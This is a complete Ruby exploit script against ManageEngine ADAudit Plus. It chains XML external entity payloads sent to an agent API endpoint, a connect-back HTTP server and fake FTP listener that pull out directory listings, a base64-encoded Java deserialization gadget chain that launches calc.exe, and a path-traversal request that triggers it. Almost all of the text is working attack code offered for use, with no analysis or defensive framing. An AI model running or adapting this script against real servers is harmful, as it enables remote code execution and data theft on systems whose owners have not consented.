# requires `gem install httparty'
require 'httparty'

require 'json'
require 'socket'
require 'timeout'
require 'base64'

# The target server
TARGET = ARGV[0] || '10.0.0.148'
TARGET_PORT = ARGV[1] || '8081'
puts "TARGET: #{ TARGET }:#{ TARGET_PORT }"

# Any domain that the ADAudit Plus server recognizes
DOMAIN = ARGV[2] || 'ad.example.local'
puts "Using domain: #{ DOMAIN }"

# The address where this script is running
LHOST = ARGV[3] || '10.0.0.146'
puts "Connectback host: #{ LHOST }"

# These three ports have to be available
FTP_PORT = 2121
HTTP_PORT1 = 4444
HTTP_PORT2 = 5555
puts "Connectback ports: #{ FTP_PORT }, #{ HTTP_PORT1 }, #{ HTTP_PORT2 }"
puts

# Serialized Java object that starts calc.exe
FILE = Base64::decode64('rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LjoYjqcyKkSAIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgA/b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmNvbXBhcmF0b3JzLkNvbXBhcmFibGVDb21wYXJhdG9y+/SZJbhusTcCAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AARMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAABtnK/rq+AAAAMwA/CgADACIHAD0HACUHACYBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFrSCT85Hd7z4BAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAE1N0dWJUcmFuc2xldFBheWxvYWQBAAxJbm5lckNsYXNzZXMBADVMS0s1VTM2Z0xPL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAnAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhDAAKAAsHACgBADNLSzVVMzZnTE8vcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAUamF2YS9pby9TZXJpYWxpemFibGUBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BAB9LSzVVMzZnTE8vcGF5bG9hZHMvdXRpbC9HYWRnZXRzAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQAQamF2YS9sYW5nL1N0cmluZwcAMAEAB2NtZC5leGUIADIBAAIvYwgANAEACGNhbGMuZXhlCAA2AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMADgAOQoAKwA6AQANU3RhY2tNYXBUYWJsZQEAHTBOaTl1ZFp2anpHeVpLYkxVV3M5V3Z0Zk1ZaEhlAQAfTDBOaTl1ZFp2anpHeVpLYkxVV3M5V3Z0Zk1ZaEhlOwAhAAIAAwABAAQAAQAaAAUABgABAAcAAAACAAgABAABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAADAADgAAAAwAAQAAAAUADwA+AAAAAQATABQAAgAMAAAAPwAAAAMAAAABsQAAAAIADQAAAAYAAQAAADUADgAAACAAAwAAAAEADwA+AAAAAAABABUAFgABAAAAAQAXABgAAgAZAAAABAABABoAAQATABsAAgAMAAAASQAAAAQAAAABsQAAAAIADQAAAAYAAQAAADkADgAAACoABAAAAAEADwA+AAAAAAABABUAFgABAAAAAQAcAB0AAgAAAAEAHgAfAAMAGQAAAAQAAQAaAAgAKQALAAEADAAAADUABgACAAAAIKcAAwFMuAAvBr0AMVkDEjNTWQQSNVNZBRI3U7YAO1exAAAAAQA8AAAAAwABAwACACAAAAACACEAEQAAAAoAAQACACMAEAAJdXEAfgAQAAAB1Mr+ur4AAAAzABsKAAMAFQcAFwcAGAcAGQEAEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3RhbnRWYWx1ZQVx5mnuPG1HGAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADRm9vAQAMSW5uZXJDbGFzc2VzAQAlTEtLNVUzNmdMTy9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vOwEAClNvdXJjZUZpbGUBAAxHYWRnZXRzLmphdmEMAAoACwcAGgEAI0tLNVUzNmdMTy9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vAQAQamF2YS9sYW5nL09iamVjdAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQAfS0s1VTM2Z0xPL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwAhAAIAAwABAAQAAQAaAAUABgABAAcAAAACAAgAAQABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAAD0ADgAAAAwAAQAAAAUADwASAAAAAgATAAAAAgAUABEAAAAKAAEAAgAWABAACXB0AARQd25ycHcBAHhxAH4ADXg=')

# This is how long we hold the FTP server open for
FTP_WAIT = 3

# How long to wait for the file to "arrive"
DELAY_BEFORE_REQUESTING_FILE = 1

# How long to hold open the HTTP server
HTTP_HOLD_OPEN = 10

LIST_FILES_PAYLOAD = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>
  <!DOCTYPE data [
    <!ENTITY % file SYSTEM \"file:%%FOLDER%%\">
    <!ENTITY % dtd SYSTEM \"http://#{ LHOST }:%%PORT%%/data.dtd\"> %dtd;
  ]>

  <data>&send;</data>"

UPLOAD_FILE_PAYLOAD = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>
  <!DOCTYPE data [
    <!ENTITY % xxe SYSTEM \"jar:http://#{ LHOST }:%%PORT%%/upload.jar!/file.txt\"> %xxe;
  ]>
"

def recv_until(s, str)
  out = ''

  loop do
    data = s.recv(32)
    if !data || data == ''
      puts "Connection closed"
      exit
    end

    out += data
    if out.end_with?(str)
      return out
    end
  end
end

# The HTTP server is in a thread and returns instantly
def start_http_server_thread(response, port, hold_open_for = 0)
  return Thread.new do
    http_server = TCPServer.new(port)
    c = http_server.accept()
    # puts "Received HTTP connection!"
    recv_until(c, "\r\n\r\n")
    c.print "HTTP/1.1 200 OK\r\n"

    if hold_open_for > 0
      c.print "Connection: keep-alive\r\n"
    end
    #c.print "Content-Length: #{ response.length }\r\n"
    c.print "\r\n"
    c.print response

    if hold_open_for > 0
      # puts "Holding for #{ hold_open_for } seconds.."
      sleep(hold_open_for)
    end

    c.close()
    http_server.close()
  end
end

# The FTP server is NOT in a thread, and returns when it's finished
def start_ftp_server()
  ftp_server = TCPServer.new(FTP_PORT)
  c = ftp_server.accept()
  c.puts "200 FTP Server"
  recv_until(c, "\n")
  c.puts "331 password please"
  recv_until(c, "\n")

  out = ''
  begin
    Timeout::timeout(FTP_WAIT) do
      loop do
        c.puts "230 more data please!"
        out = recv_until(c, "\n")
      end
    end
  rescue
  end
  c.close()
  ftp_server.close()

  return out.gsub(/.*RETR /, '').split(/\n/).map { |l| l.strip() }
end

def do_http_request(payload)
  "Sending: #{ payload }"
  HTTParty.post(
    "http://#{ TARGET }:#{ TARGET_PORT }/api/agent/tabs/agentData",
    :body => [{
      "DomainName" => DOMAIN,
      "EventCode" => 4688,
      "EventType" => 0,
      "TimeGenerated" => 0,
      "Task Content" => payload,
    }].to_json(),

    :headers => {
      "Content-Type" => "application/json",
    },
  )
end

def list_files(folder)
  # Start an HTTP server
  start_http_server_thread("<!ENTITY % all \"<!ENTITY send SYSTEM 'ftp://#{ LHOST }:#{ FTP_PORT }/%file;'>\"> %all;", HTTP_PORT1)

  do_http_request(LIST_FILES_PAYLOAD.gsub(/%%FOLDER%%/, folder).gsub(/%%PORT%%/, HTTP_PORT1.to_s))

  return start_ftp_server()
end

def upload_and_hold_open(file_data, hold_open_for = 30)
  # Start an HTTP server
  t = start_http_server_thread(file_data, HTTP_PORT2, hold_open_for)

  do_http_request(UPLOAD_FILE_PAYLOAD.gsub(/%%PORT%%/, HTTP_PORT2.to_s))

  return t
end

puts "Attempting to find users from c:\\users..."
USERS = list_files("\\users\\") - ['Default', 'Default User', 'All Users', 'desktop.ini', 'Public']
if USERS.length == 0
  puts "Couldn't find any non-default folders in \\users!"
  exit
end
puts "Found possible users: #{ USERS.join(', ') }"
puts

puts "Sending #{ FILE.length }-byte payload..."
t = Thread.new do
  upload_and_hold_open(FILE, HTTP_HOLD_OPEN).join
end

puts
puts "Waiting #{ DELAY_BEFORE_REQUESTING_FILE } seconds for the file to sync..."
sleep(DELAY_BEFORE_REQUESTING_FILE)

puts
USERS.each do |u|
  path = "/users/#{ u }/appdata/local/temp"
  puts "Searching #{ path } for possible payloads..."
  list_files(path).select { |f|
    f =~ /^jar_cache/
  }.each do |f|
    puts "Trying to execute #{ path }/#{ f }..."
    HTTParty.get("http://#{ TARGET }:#{ TARGET_PORT }/cewolf/logo.png?img=/../../../../../../../../../../../../../#{ path }/#{ f }")
  end
end

# Wait for threads to finish
t.join()
